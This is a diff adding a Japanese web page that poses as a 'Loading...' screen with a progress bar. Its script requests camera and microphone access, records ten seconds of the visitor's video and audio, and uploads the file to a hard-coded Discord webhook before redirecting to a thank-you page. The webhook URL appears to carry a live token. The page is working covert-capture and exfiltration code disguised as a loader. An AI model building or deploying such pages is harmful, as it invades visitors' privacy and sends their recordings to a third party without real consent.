@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>読み込み中...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #f0f0f0;
+    }
+    #progressText {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    #progressBar {
+      width: 80%;
+      height: 25px;
+      background: #ddd;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    #progressFill {
+      height: 100%;
+      background: #4caf50;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+  </style>
+</head>
+<body>
+
+<div id="progressText">読み込み中... 0%</div>
+<div id="progressBar">
+  <div id="progressFill"></div>
+</div>
+
+<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq"; // ← 自分のWebhookに変更
+  const durationMs = 10000; // 録画10秒
+  const updateInterval = 100; // 0.1秒ごとに更新
+
+  const progressText = document.getElementById("progressText");
+  const progressFill = document.getElementById("progressFill");
+
+  if (typeof MediaRecorder === 'undefined') {
+    alert("このブラウザは録画に対応していません。");
+  } else {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        const file = new File([blob], "recorded.webm");
+
+        const formData = new FormData();
+        formData.append("file", file);
+        formData.append("content", "🎥 完了しました");
+
+        fetch(webhookUrl, {
+          method: "POST",
+          body: formData
+        }).then(() => {
+          window.location.href = "thanks.html"; // ← 録画後に移動したいHTML
+        }).catch(err => {
+          alert("送信失敗: " + err);
+        });
+      };
+
+      mediaRecorder.start();
+
+      // プログレスバー制御
+      let currentStep = 0;
+      const totalSteps = durationMs / updateInterval;
+
+      const interval = setInterval(() => {
+        currentStep++;
+        const percent = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
+        progressText.textContent = `録画中... ${percent}%`;
+        progressFill.style.width = `${percent}%`;
+
+        if (currentStep >= totalSteps) {
+          clearInterval(interval);
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }
+      }, updateInterval);
+    }).catch(err => {
+      alert("カメラ・マイクのアクセスが拒否されました：" + err);
+    });
+  }
+</script>
+
+</body>
+</html>
